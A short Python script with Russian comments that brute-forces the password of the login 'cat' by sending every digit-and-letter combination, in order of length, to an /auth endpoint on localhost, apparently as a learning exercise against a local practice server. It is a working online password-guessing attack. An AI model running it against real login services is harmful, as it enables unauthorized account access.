import requests

state = 0
digits_count = 0
alphabet = '0123456789abcdefghijklmnopqrstuvwxyz'


def next_password():
    global state
    global digits_count

    n = state
    base = len(alphabet)
    result = ''
    while len(result) < digits_count:
        rest = n % base
        result = alphabet[rest] + result
        n = n // base

    # проверить пора ли добавлять цифру
    # более топорный способ - all(char == alphabet[-1] for char in result):
    state += 1
    if state == base ** digits_count:
        state = 0
        digits_count += 1

    return result


login = 'cat'

while True:
    password = next_password()
    data = {'login': login, 'password': password}
    response = requests.post('http://127.0.0.1:4000/auth', json=data)
    if response.status_code == 200:
        print(f'{login=} {password=} ПОЛУЧИЛОСЬ!!!')
        break
    else:
        print(f'{login=} {password=} не подошел')
